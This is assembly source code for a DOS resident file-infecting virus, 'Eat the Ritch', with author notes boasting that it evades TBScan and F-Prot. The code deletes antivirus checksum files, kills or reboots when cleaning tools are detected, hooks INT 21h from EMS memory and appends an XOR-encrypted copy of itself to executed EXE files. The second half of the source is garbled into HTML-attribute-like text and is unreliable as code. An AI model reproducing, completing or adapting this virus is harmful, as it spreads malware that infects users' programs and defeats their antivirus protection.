

;Virus Name ³ Eat the Ritch
;Type       ³ EMS TSR Dos EXE/PKlited EXE infector
;Good Points³ WDBI Capable,infects PKlited exe's, 32bit Disk frendly,
;           ³ EMM friendly Not detecable by TBscan 6.32 and F-Prot 2.16d
;Author     ³ Stalker X /Sx
;PS:link as EXE

;Notes:
;
;Well here is my latest virus. This one is undetectable by TBSCAN v6.33!
;And F-Prot v2.16d!. There is a rather good improvement in TBAV v6.33
;is has less false detects on normal hueristic scanning and all around
;TBAV v6.33 gives i bit more secure protection .. about 0.00000001% more :)
;Ok this Virus cannot be cleaned by TBCLEAN v6.33 or down ..
;it gives an error and reboots the computer when it detects tbdriver is
;active.
;It runs under windows 32bit and does infect any dos boxes opend by the user.
;It goes TSR in EMS and one SECRET WEPON AGAINS the O Mighty Thunder Byte
;an ... an ... an .... yes .. yes .. INT 12. HEHEHEH yes thats correct
;Check this one out ... 

;O one more thingggy it infects PKLITED EXE's too and deletes the obvuis
;CRC check files ... 


%out [?7h[40m[2J
%out Another Virus by SX/NuKE
%out Direct form The Nightmare Factory

DcSize    equ (BodyStart-VStub)
VirusSize equ (BodyEnd-VStub)
BodySize  equ (BodyEnd-BodyStart) 

 jumps
.model tiny
.286
.code
 assume cs:@code
 org 0

;ÄVirusÄDecoderÄStubÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
VStub    :    int 12h                    ;Throw off Tbscan
              mov cx,VirusSize           ;Decoder stuff
               db 0bfh                   ;!
DcStart        dw BodyStart              ;!
DCode    :     db 2eh,81h,35h            ;! 
DcKey          dw 0                      ;!
              inc di                     ;!
             loop DCode                  ;!

;ÄVirusÄSetupÄRoutinesÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
BodyStart:  push cs                      ;Save cs
	     pop ss                      ;Restore cs in ss
              db 0bdh                    ;Setup the delta ofs
Delta         dw 0                       ;Varible for delta

;ÄGetÄINT21ÄSEG:OFSÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
             mov ds,bx                   ;ds=0
             lds si,dword ptr ds:[21h*4] ;Get SEG:OFS
	     mov word ptr cs:[bp+Old21],si;Save OFS
	     mov word ptr cs:[bp+Old21+2],ds;Save SEG

;ÄStartÄVirusÄStuffiesÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	    push cs                      ;Save cs
             pop ds                      ;Restore cs in ds
            push es                      ;Save PSP

             lea dx,[bp+TBfile]          ;Set source  
	     mov ax,4301h                ;Set new file attribute
	     xor cx,cx                   ;Clear attribute in cx
	     int 21h                     ;Do it.

             mov ah,41h                  ;Delete file
             lea dx,[bp+TBfile]          ;!
             int 21h                     ;!

             lea dx,[bp+CPfile]          ;Set source  
	     mov ax,4301h                ;Set new file attribute
	     xor cx,cx                   ;Clear attribute in cx
	     int 21h                     ;Do it.
 
             mov ah,41h                  ;!
             lea dx,[bp+CPfile]          ;!
             int 21h                     ;!

             lea dx,[bp+MSfile]          ;Set source  
	     mov ax,4301h                ;Set new file attribute
	     xor cx,cx                   ;Clear attribute in cx
	     int 21h                     ;Do it.

             mov ah,41h                  ;!
             lea dx,[bp+MSfile]          ;!
             int 21h                     ;!

No_TBClean:pushf                         ;Save flags
	     int 1                       ;Call int 1
	   pushf                         ;Save flags
	     pop ax                      ;Resstore flags in bx
	     pop bx                      ;Restore flags in bx
	     cmp ax,bx                   ;Detect TbClean
	     mov ax,4bfeh                ;Check ID function set
              je Check_ID                ;Jmp into never never land
             int 20h                     ;Kill Cleaning scan    

Check_ID:    int 21h                     ;Do it.
	     cmp ah,13                   ;Check return code.
	      je @RETURN                 ;EXIT If active.

CHK_TBDriver:mov ax,0ca40h               ;Check if TbDriver v6.3x is installed
	     int 2fh                     ;Do it.
	     cmp ax,0ca3fh               ;Check id returned
	     jne Install_ETR             ;if not CA3Fh then continue infection
	     lea dx,[bp+ErrMsg]          ;Setup dx with ErrMsg
	     mov ah,9                    ;Set print function
	     int 21h                     ;Print Error Message
	     int 19h                     ;Reboot

ErrMsg db 'TbDriver, TBAV TSR utilities driver (C) Copyright 1992-94'
       db ' Thunderbyte BV.',10,13,'þ ERROR!.',7,7,7,'$'

TBfile db 'anti-vir.dat',0
CPfile db 'chklist.cps',0
MSfile db 'chklist.ms',0
Dummy  dw 0

;ÄEMSÄDriverÄCheckÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Install_ETR: mov ax,3567h                ;Get INT vec 67h
             int 21h                     ;Do it.
	     mov di,0Ch                  ;Offset of 'EMMXXXX'
	     cmp word ptr es:[di],'XM'   ;Check for 'MX' id
	     jne @RETURN                 ;If not found continue normal exec.

;ÄAllocateÄEMSÄMemoryÄandÄMapÄPageÄ0ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	     mov ah,41h                  ;Get Pageframe Start
	     int 67h                     ;Do it.
	    push bx                      ;Save the Page 0 address

	     mov ah,42h                  ;Check available Pages
	     int 67h                     ;Do it.
	      or ah,ah                   ;Check return code
	     jnz @RETURN                 ;Exit to program on error
	      or bx,bx                   ;Check if pages=0
	      jz @RETURN                 ;if 0 then exit to program

	     mov bx,1                    ;One 16k Page
	     mov ah,43h                  ;Allocate Pages
	     int 67h                     ;Do it
	      or ah,ah                   ;Check return code
	     jnz @RETURN                 ;Exit to program in error

	     xor bx,bx                   ;Map 1 page to phisical page 0
	     mov ax,4400h                ;Map Page
	     int 67h                     ;Do it

;ÄCopyÄVirusÄtoÄPageFrameÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	     pop es                      ;Set Pageframe address
	     xor di,di                   ;Clear di
	     lea si,[bp+VStub]           ;Set Si to source
	     mov cx,VirusSize/2          ;Set Cs to size of virus in words
	     rep movsw                   ;Copy Virus to memory

;ÄhookÄintsÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
            push ds                      ;Save ds
             mov ds,cx                   ;ds=0
             mov bx,21h*4                ;bx=int 21h addr
	     cli                         ;Clear interrupt falg
	     mov word ptr ds:[bx],offset ETR_TSR
	     mov word ptr ds:[bx+2],es   ;!
	     sti                         ;Set interrupt flag
             pop ds                      ;Restore ds

@RETURN:     pop bx                      ;bx=PSP
	     mov ax,10h                  ;!
	     add ax,bx                   ;Calc new cs
	     add [bp+_CS],ax             ;Save new cs
	     add ax,[bp+_SS]             ;Calc new ss
	     mov es,bx                   ;es=PSP
	     mov ds,bx                   ;ds=PSP
	     mov bx,[bp+_SP]             ;bx=Old sp
	     cli                         ;Clear interrupt falg
	     mov ss,ax                   ;ss=New ss
	     mov sp,bx                   ;sp=Org sp
	     sti                         ;Set interrupt flag
	      db 0eah                    ;Far Jmp
_IP           dw 0                       ;New ip
_CS           dw 0-10h                   ;New cs
_SP           dw ?                       ;New sp
_SS           dw ?                       ;New ss
MYID          db 'Eat the Ritch virus by Sx (c) 1995 AeroSmith Rulze!'

ETR_TSR:   pushf                         ;Save Flags
	   pusha                         ;Save all general registers
	    push ds                      ;Save ds
	    push es                      ;Save es
             cld                         ;Clear direction flag

;ÄCheckÄCallÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	     cmp ax,4B00h                ;Check function call
	      je Infect                  ;If execute file then infect
	     cmp ax,4BFEh                ;Check if Virus ID
	     jne Exit_TSR                ;If not any of them then continue
	     pop es                      ;Restore Es
	     pop ds                      ;Restore Ds
	    popa                         ;Restore All general registers
	    popf                         ;Restore flags
	     mov ah,13                   ;Set virus ID
	    iret                         ;Interrupt return

;ÄStartÄInfectionÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Infect:      mov si,dx                   ;Set source

Find_0:    lodsb                         ;Load next byte
             cmp al,0                    ;Find the end of the program name.
	     jne Find_0                  ;Loop until found

;ÄCheckÄasÄnotÄtoÄinfectÄWIN386.EXEÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	     cmp word ptr ds:[si-7],'68' ;Check that the current program
	      je Exit_TSR                ;executed is NOT WIN386.EXE
	     cmp word ptr ds:[si-9],'3N' ;or WIN286.EXE
	      je Exit_TSR                ;!
	     cmp word ptr ds:[si-9],'2N' ;!
	      je Exit_TSR                ;!

;ÄAllÄokÄSoÄfarÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	    push ds                      ;Save for later use by attrib
	    push dx                      ;Save for later use by attrib

	     mov ax,4300h                ;Get file attribute
	    call Int21h                  ;Do it.
	    push cx                      ;Save the org attrib in cx on stack

	     mov ax,4301h                ;Set new file attribute
	     xor cx,cx                   ;Clear attribute in cx
	    call Int21h                  ;Do it.

	     mov ax,3d02h                ;Open file for read and write
	    call Int21h                  ;Do it.
	      jc Exit_TSR                ;Exit to org TSR if error
	     mov bx,ax                   ;Save handle in bx

	     mov ax,5700h                ;Get file Time and Date
	    call Int21h                  ;Do it.
	    push dx                      ;Save dx on stack
	    push cx                      ;Save cx on stack

	    push cs                      ;Save cs
	     pop ds                      ;Restore cs in ds for general use
             mov ax,'ZM'                 ;!
             mov es,ax                   ;Save ax in es for later use

	     mov dx,offset Signature     ;Set dx to Dest array
	     mov cx,24                   ;cx=size to read
	     mov ah,3fh                  ;Set function
	    call Int21h                  ;Do it.
	      jc CloseF                  ;Close file on error

             mov cx,es                   ;cx='ZM'
	     cmp cs:[Signature],cx       ;Make sure it's EXE file
	     jne CloseF                  ;Close file if it's not
	     cmp cs:[Negative_checksum],9;Make sure it's not infected already
	      je CloseF                  ;Close file if it is

             xor cx,cx                   ;Clear cx
	     mov dx,3ah                  ;cx:dx -> PTR to WIN Header
	     mov ax,4200h                ;Set file pointer location
	    call Int21h                  ;Do it.

	     mov dx,offset NewPtr_MSW    ;Set dx to Dest array
	     mov cx,4                    ;cx=size to read (4 byte ptr)
             mov ah,3fh                  ;Set function     
            call Int21h                  ;Do it.     

             mov cx,cs:[NewPtr_MSW]      ;Set new pointer     
             mov dx,cs:[NewPtr_LSW]      ;Set new pointer     
	     mov ax,4200h                ;Goto extended header in file
	    call Int21h                  ;Do it.      

	     mov dx,offset NewPtr_MSW    ;Set dx to Dest Array
	     mov cx,2                    ;cx=size to read 2 ID bytes
	     mov ah,3fh                  ;Set function
            call Int21h                  ;Do it.     

	     cmp cs:[NewPtr_MSW],'EN'    ;Check for windos exe
              je CloseF                  ;Close file if windows     
             cmp cs:[NewPtr_MSW],'EL'    ;Check for windos exe     
              je CloseF                  ;Close file if windows     
             cmp cs:[NewPtr_MSW],'XL'    ;Check for windos exe     
              je CloseF                  ;Close file if windows     

             mov cs:[Negative_checksum],9;!

;>Modify EXE header and calculate new header values< push="" cs:[pre_reloc_cs]="" ;save="" org="" cs="" pop="" cs:[_cs]="" ;restore="" org="" cs="" in="" _cs="" push="" cs:[pre_reloc_ip]="" ;save="" org="" ip="" pop="" cs:[_ip]="" ;restore="" org="" ip="" in="" _ip="" push="" cs:[prereloc_ss]="" ;save="" org="" ss="" pop="" cs:[_ss]="" ;restore="" org="" ss="" in="" _ss="" push="" cs:[initial_sp]="" ;save="" org="" sp="" pop="" cs:[_sp]="" ;restore="" org="" sp="" in="" _sp="" xor="" cx,cx="" ;clear="" cx="" xor="" dx,dx="" ;clear="" dx="" mov="" ax,4202h="" ;get="" file="" length="" call="" int21h="" ;do="" it.="" push="" dx="" ;save="" dx="" push="" ax="" ;save="" ax="" mov="" cx,virussize="" ;cx="Virus" size="" add="" ax,cx="" ;add="" to="" file="" length="" adc="" dx,0="" ;dx:ax="" file+virus="" push="" ax="" ;save="" ax="" shr="" ax,9="" ;div="" dx:ax="" 512="" ror="" dx,9="" ;!="" stc="" ;set="" carry="" adc="" dx,ax="" ;dx+ax="" pop="" ax="" ;restore="" ax="" and="" ah,1="" ;mod="" 512="" mov="" cs:[file_pages],dx="" ;save="" file="" pages="" mov="" cs:[last_page_size],ax="" ;save="" mod="" 512="" pop="" ax="" ;restore="" ax="" pop="" dx="" ;restore="" dx="" push="" bx="" ;save="" bx="" mov="" bx,cs:[header_paras]="" ;set="" bx="Header" paragraph="" shl="" bx,4="" ;bx*16="" sub="" ax,bx="" ;ax-bx="" sbb="" dx,0="" ;dx:ax="" filesize-header="" mov="" cx,16="" ;cx="16" div="" cx="" ;[dx:ax]/16="" mov="" cs:[delta],dx="" ;save="" delta="" ofs="" mov="" cs:[initial_sp],0="" ;set="" sp="FFFF" mov="" cs:[dcstart],offset="" bodystart="" add="" cs:[dcstart],dx="" ;adjust="" starting="" point="" to="" decode="" mov="" cs:[pre_reloc_ip],dx="" ;save="" new="" ip="" mov="" cs:[pre_reloc_cs],ax="" ;save="" new="" cs="" pop="" bx="" ;restore="" bx="" xor="" cx,cx="" ;clear="" cx="" xor="" dx,dx="" ;clear="" dx="" mov="" ax,4200h="" ;rewind="" file="" pointer="" call="" int21h="" ;do="" it.="" mov="" ah,40h="" ;write="" header="" back="" mov="" cx,24="" ;cx="size" to="" write="" back="" mov="" dx,offset="" signature="" ;dx="source" call="" int21h="" ;do="" it.="" xor="" cx,cx="" ;clear="" cx="" xor="" dx,dx="" ;clear="" dx="" mov="" ax,4202h="" ;set="" file="" point="" to="" eof="" call="" int21h="" ;do="" it.="" call="" randomnumber="" mov="" cs:[dckey],dx="" push="" cs="" ;save="" cs="" pop="" es="" ;restore="" cs="" in="" es="" xor="" si,si="" ;clear="" cs="" mov="" di,offset="" etrallend="" ;set="" dest="" mov="" cx,virussize/2="" ;set="" size="" rep="" movsw="" ;copy="" virus="" mov="" ax,cs:[dckey]="" mov="" si,offset="" etrallend+dcsize="" mov="" cx,bodysize="" encode="" :="" xor="" word="" ptr="" cs:[si],ax="" inc="" si="" loop="" encode="" mov="" ah,40h="" ;write="" virus="" encoded="" body="" mov="" cx,virussize="" ;!="" mov="" dx,offset="" etrallend="" ;!="" call="" int21h="" ;do="" it.="" closef:="" pop="" cx="" ;restore="" cx="" pop="" dx="" ;restore="" dx="" mov="" ax,5701h="" ;set="" file="" time="" and="" date="" call="" int21h="" ;do="" it.="" mov="" ah,3eh="" ;close="" file="" call="" int21h="" ;do="" it.="" pop="" cx="" ;restore="" cx="" pop="" dx="" ;restore="" dx="" pop="" ds="" ;restore="" ds="" mov="" ax,4301h="" ;set="" file="" attribute="" call="" int21h="" ;do="" it.="" exit_tsr="" :="" pop="" es="" ;restore="" es="" pop="" ds="" ;restore="" ds="" popa="" ;restore="" all="" general="" registers="" popf="" ;restore="" flags="" db="" 0eah="" ;far="" jmp="" to="" org="" int="" 21h="" old21="" dd="" ;var="" for="" int="" vec="" int21h="" :pushf="" ;save="" flags="" call="" dword="" ptr="" cs:[old21]="" ;call="" org="" int="" 21h="" retn="" ;return="" to="" caller="" randomnumber="" :xor="" ah,ah="" ;clear="" ah="" int="" 1ah="" ;get="" time="" mov="" al,00000110b="" ;set="" al="Mask" out="" 43h,al="" ;get="" pit="" value="" in="" al,40h="" ;al="Value" xor="" dl,al="" ;xor="" dl,al="" in="" al,40h="" ;al="Next" value="" xor="" dh,al="" ;!="" retn="" ;return="" to="" caller="" bodyend:="" signature="" dw="" ;="" 'mz'="" last_page_size="" dw="" ;="" file_pages="" dw="" ;="" reloc_items="" dw="" ;="" header_paras="" dw="" ;="" minalloc="" dw="" ;="" maxalloc="" dw="" ;="" prereloc_ss="" dw="" ;="" initial_sp="" dw="" ;="" negative_checksum="" dw="" ;="" pre_reloc_ip="" dw="" ;="" pre_reloc_cs="" dw="" ;="" newptr_msw="" dw="" ;="" newptr_lsw="" dw="" ;="" etrallend:="" end="" vstub="">